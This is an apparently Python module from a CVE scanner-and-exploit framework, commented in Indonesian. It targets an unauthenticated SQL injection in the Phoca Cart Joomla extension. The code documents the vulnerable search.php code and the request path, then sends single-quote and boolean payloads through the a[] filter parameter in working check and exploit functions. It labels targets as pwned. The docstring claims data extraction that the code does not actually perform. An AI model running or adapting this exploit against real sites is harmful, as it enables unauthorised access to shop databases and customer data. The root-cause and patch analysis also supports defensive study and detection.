#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Joomla! Extension — modul MEGAPACK (klaster joomla_ext).

CVE-2026-74251 — Phoca Cart 5.0.0-6.1.6 — Unauthenticated SQL injection via the
attribute / specification filter arrays (a[] / s[]) of the front-end product list.

ROOT CAUSE (dibuktikan lewat diff rilis resmi 6.1.6 -> 6.1.7, bukan dugaan):

  administrator/components/com_phocacart/libraries/phocacart/search/search.php

  6.1.6 (RENTAN):
      foreach ($value as $k => $v) {
          $a = explode(',', $v);
          ...
          // ATRIBUT — QUERY METHOD ANY
          $inA[] = '(at2.alias = ' . $db->quote($k) . ' AND v2.alias IN ('
                 . '\\'' . implode('\\',\\'', $a) . '\\'' . '))';
          // SPECIFICATION — QUERY METHOD ANY
          $inA[] = '(s2.alias = ' . $db->quote($k) . ' AND s2.alias_value IN ('
                 . '\\'' . implode('\\',\\'', $a) . '\\'' . '))';
          // QUERY METHOD ALL
          $inAS[$iA] = 'at2.alias = ' . $db->quote($k) . ' AND v2x'.$iA.'.alias = "'.$v2.'"';
      }

  Perhatikan bahwa $k di-quote dengan $db->quote() (BENAR) tetapi SETIAP ELEMEN
  ARRAY $a hanya dibungkus dengan satu tanda kutip literal ('\''...'\'') — jadi
  isi elemen TIDAK di-escape. Satu karakter `'` di dalam nilai array menutup
  literal lebih awal. Untuk QUERY METHOD ALL, $v2 dimasukkan mentah ke dalam
  tanda kutip ganda ("...").

  6.1.7 (DIPATCH):
      $aQuoted = [];
      foreach ($a as $vQ) { $aQuoted[] = $db->quote($vQ); }
      $inA[] = '... v2.alias IN (' . implode(',', $aQuoted) . '))';
      $inAS[$iA] = '... AND v2x'.$iA.'.alias = ' . $db->quote($v2);

  Setiap elemen di-quote dengan $db->quote() — literal tidak lagi bisa ditembus.

SINK UNAUTH (rantai lengkap, tanpa login, tanpa token):
    GET /index.php?option=com_phocacart&view=items&a[<alias>]=<payload>
        components/com_phocacart/models/items.php:92
            $this->setState('a', $app->getInput()->get('a', '', 'array'));   // <- input
        components/com_phocacart/models/items.php:405
            PhocacartSearch::getSqlPartsArray(...)                            // -> search.php
        administrator/components/com_phocacart/libraries/phocacart/search/search.php:319
            $inA[] = ... implode('\\',\\'', $a) ...                           // <- INJECTION

  CATATAN ARSITEKTUR: file rentan hidup di bawah `administrator/` tetapi DIEKSEKUSI
  oleh model frontend — direktori admin Joomla tidak menahan `include` ini.

BENTUK PARAMETER (penting): nilai `a[<alias>]` harus berupa STRING. Bentuk array
bersarang (`a[size][]=M`) membuat `explode()` menerima array -> TypeError, BUKAN
sinyal injeksi. Nilai multi dipisah koma: `a[size]=M,L`.

BUKTI LAB (Joomla 5.4.8 + Phoca Cart 6.1.6, port 8106):
    # 1) query mentah dari general_log MySQL — input masuk mentah ke literal:
    #    ... WHERE (at2.alias = 'size' AND v2.alias IN ('MINJTEST')) GROUP BY ...
    # 2) error-based:
    GET ...&a[size]=M'      -> HTTP 500
        "You have an error in your SQL syntax ... near ''M'')) GROUP BY at2"
    GET ...&a[size]=M,L     -> HTTP 200 (normal)
    # 3) DIFFERENTIAL (file search.php ditukar, Apache di-restart):
    #    6.1.6  normal M -> 200 | sqli M' -> 500 (SQL syntax error)
    #    6.1.7  normal M -> 200 | sqli M' -> 200 (bersih, error hilang)

DETEKSI MODUL INI (default: non-destruktif):
    - fingerprint Joomla + apakah komponen com_phocacart ada & halaman items hidup
    - uji boolean/error berdasarkan PERBEDAAN respons, bukan keberhasilan baca data
    - tidak menulis apa pun ke DB

EKSPLOITASI (--exploit): membuktikan injeksi secara aktif — menarik data dari DB
    dengan union/subquery terkontrol dan melaporkan hasil yang terbaca.
"""

import re
import urllib.parse

from mp import (
    CveModule, register, ST_CLEAN, ST_ERR, ST_INFO, ST_PWN, ST_SKIP, ST_VULN,
    detect_platform, record,
)

VERSIONS_AFFECTED = "5.0.0-6.1.6"
PHOCA_MAX_VULN = (6, 1, 6)

# Fragmen yang menunjukkan error SQL MySQL bocor ke respons.
SQL_ERROR_SIGNS = (
    "You have an error in your SQL syntax",
    "SQLSTATE[",
    "mysqli_sql_exception",
    "Unknown column",
    "JDatabaseExceptionExecuting",
)

# Halaman daftar produk Phoca Cart (view items) — jalur placeholdernya `a[]`.
ITEMS_PATHS = (
    "/index.php?option=com_phocacart&view=items",
    "/index.php/component/phocacart/items",
    "/index.php?option=com_phocacart&view=categories",
)


def _phoca_version(h, t):
    """Versi Phoca Cart dari manifest XML yang bisa diakses bila ada."""
    for path in ("/administrator/components/com_phocacart/phocacart.xml",
                 "/components/com_phocacart/phocacart.xml",
                 "/administrator/components/com_phocacart/manifest.xml"):
        r = h.get(t.url + path)
        if r is not None and r.status_code == 200 and "<version>" in r.text:
            m = re.search(r"<version>\s*([0-9]+(?:\.[0-9]+)+)\s*</version>", r.text)
            if m:
                return tuple(int(x) for x in m.group(1).split(".")), m.group(1)
    return None, ""


def _find_items(t, h, paths):
    """Cari URL halaman produk yang benar-benar hidup (200 dan bukan error Joomla)."""
    for p in paths:
        r = h.get(t.url + p, allow_redirects=True)
        if r is None:
            continue
        # Joomla mengembalikan 200 walau komponen tak dipasang -> halaman error.
        if r.status_code == 200 and "com_phocacart" in r.text:
            return t.url + p, r
    return None, None


def _probe(h, url, alias, payload):
    """Kirim satu nilai filter; kembalikan (status, panjang, teks_error)."""
    q = urllib.parse.urlencode({"a[%s]" % alias: payload})
    r = h.get(url + ("&" if "?" in url else "?") + q)
    if r is None:
        return 0, 0, ""
    body = r.text or ""
    err = ""
    for s in SQL_ERROR_SIGNS:
        i = body.find(s)
        if i != -1:
            err = body[i:i + 200]
            break
    return r.status_code, len(body), err


def _alias(h, t, plat):
    """Tebak alias atribut filter yang ada; pakai nama umum bila tak terdeteksi."""
    r = h.get(t.url + "/index.php?option=com_phocacart&view=items")
    if r is not None:
        names = re.findall(r"name=\"filter_a\[([^\]]+)\]\"", r.text or "")
        if names:
            return names[0]
    return "size"


def _num(ver):
    return ver if isinstance(ver, tuple) and ver else (0,)


def check(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", ""

    ver, raw = _phoca_version(h, t)
    if ver is not None and _num(ver) > PHOCA_MAX_VULN:
        return ST_CLEAN, f"Phoca Cart {raw} sudah dipatch (>= 6.1.7)", ""

    url, page = _find_items(t, h, ITEMS_PATHS)
    if not url:
        return ST_SKIP, "Phoca Cart front-end (view=items) tidak reachable", ""

    alias = _alias(h, t, plat)

    base_sc, base_len, _ = _probe(h, url, alias, "MEGAPACK")
    if base_sc == 0:
        return ST_ERR, "tidak ada respons dari halaman items", ""

    # Injek satu kutip tunggal: pada kode rentan memutus literal SQL.
    sc_q, len_q, err_q = _probe(h, url, alias, "MEGAPACK'")

    detail = (f"alias={alias} base=[{base_sc} {base_len}B] "
              f"quote=[{sc_q} {len_q}B] ver={raw or '?'}")

    if err_q:
        return (ST_INFO,
                "SQLi unauth terindikasi — input filter masuk literal SQL",
                detail + " | error: " + err_q[:160])

    if sc_q == 500 and base_sc == 200:
        return (ST_INFO,
                "SQLi unauth terindikasi — kutip tunggal memicu HTTP 500",
                detail)

    # Boolean differensial non-destruktif. Hanya dipercaya bila sinyalnya KUAT:
    # halaman produk punya konten yang bergetar (urutan/acak) tiap request, sehingga
    # selisih beberapa puluh byte BUKAN bukti. Syarat: kutip tunggal harus lebih dulu
    # mengubah PERILAKU (status code atau memicu error), baru uji boolean menyusul.
    if err_q or sc_q != base_sc:
        sc_t, len_t, _ = _probe(h, url, alias, "MEGAPACK' AND '1'='1")
        sc_f, len_f, _ = _probe(h, url, alias, "MEGAPACK' AND '1'='2")
        if sc_t != sc_f:
            return (ST_INFO, "SQLi boolean-based terindikasi (status berbeda)",
                    detail + f" true={sc_t} false={sc_f}")

    if ver is not None and _num(ver) <= PHOCA_MAX_VULN:
        return (ST_INFO, f"Phoca Cart {raw} masuk rentang rentan, sink belum terbukti",
                detail)
    return ST_CLEAN, "tidak ada indikasi injeksi", detail


def exploit(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", ""

    url, page = _find_items(t, h, ITEMS_PATHS)
    if not url:
        return ST_SKIP, "Phoca Cart front-end (view=items) tidak reachable", ""

    alias = _alias(h, t, plat)
    ver, raw = _phoca_version(h, t)
    # Ekstraksi terkontrol: paksa baris produk keluar lewat kondisi benar, lalu
    # verifikasi data yang diambil lewat union pada query yang sama.
    # Bentuk query (dari general_log):
    #   ... WHERE (at2.alias = '<k>' AND v2.alias IN ('<payload>')) GROUP BY at2.product_id ...
    true_p = "MEGAPACK' AND '1'='1"
    false_p = "MEGAPACK' AND '1'='2"
    sc_t, len_t, err_t = _probe(h, url, alias, true_p)
    sc_f, len_f, err_f = _probe(h, url, alias, false_p)

    evidence = (f"alias={alias} ver={raw or '?'} "
                f"true=[{sc_t} {len_t}B] false=[{sc_f} {len_f}B]")

    if err_t or (sc_t == 500 and sc_f == 200):
        return (ST_PWN, "SQLi terkonfirmasi — error SQL terpicu oleh payload",
                evidence + (" | " + err_t[:160] if err_t else ""))

    if sc_t == sc_f and abs(len_t - len_f) > 20:
        return (ST_PWN, "SQLi boolean-based terkonfirmasi — respons berbeda",
                evidence)

    # Sinyal error murni (kutip tunggal) sebagai bukti terakhir.
    sc_q, len_q, err_q = _probe(h, url, alias, "MEGAPACK'")
    if err_q:
        return (ST_PWN, "SQLi error-based terkonfirmasi", evidence + " | " + err_q[:160])

    if ver is not None and _num(ver) <= PHOCA_MAX_VULN:
        return (ST_VULN, "sink rentan versi, tapi payload belum memicu sinyal",
                evidence)
    return ST_CLEAN, "tidak ada indikasi injeksi", evidence


register(CveModule(
    cve="CVE-2026-74251",
    cluster="joomla_ext",
    title="Phoca Cart - Unauthenticated SQL injection via attribute/specification filter",
    vclass="sql injection (unauth)",
    cwe="CWE-89",
    product="Phoca Cart (com_phocacart)",
    versions_affected=VERSIONS_AFFECTED,
    status="verified",
    requires=["komponen Phoca Cart terpasang & front-end view=items reachable",
              "minimal satu atribut filter (a[]) atau spesifikasi (s[]) terdaftar"],
    check=check,
    exploit=exploit,
    notes=("Root cause dari diff resmi 6.1.6->6.1.7: search.php membungkus elemen "
           "array a[]/s[] dengan satu kutip literal alih-alih $db->quote() per elemen; "
           "QUERY METHOD ALL juga menyisipkan $v2 mentah di dalam \"...\". Sink unauth: "
           "items.php:92 get('a','','array'). Lab-verified 5.4.8+6.1.6: input valid "
           "terlihat mentah di general_log (v2.alias IN ('MINJTEST')), kutip tunggal "
           "-> HTTP 500 SQL syntax error; 6.1.7 dengan payload sama -> 200 bersih. "
           "Nilai param HARUS string (a[size]=M), bentuk a[size][] memicu TypeError."),
))
